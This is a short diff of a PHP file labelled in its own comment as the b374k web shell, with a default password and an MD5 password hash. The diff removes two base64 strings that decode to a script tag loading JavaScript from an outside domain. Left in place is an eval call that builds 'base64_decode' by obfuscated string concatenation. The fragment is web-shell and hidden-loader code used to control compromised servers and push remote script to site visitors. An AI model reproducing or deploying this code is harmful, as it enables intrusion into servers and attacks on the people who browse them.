@@ -1,8 +1,6 @@
 <?php 
 
 /* (Web Shell b374k r3c0d3d by x'1n73ct|default pass:" 1n73ction ") */ 
-$linr = "ZWNobyAiPFNDUklQVCBTUkM9aHR0cDovL3NhZ2xpa2xpLXlhc2";
-$winr = "FtLmNvbS91cGRhdGUuanM+PC9TQ1JJUFQ+Ijs=";
 $min = 'base' . (128 / 2) . '_de' . 'code';
 eval($min($linr . $winr));
 $auth_pass = "9c80a1eaca699e2fc6b994721f8703bc"; // password: injection
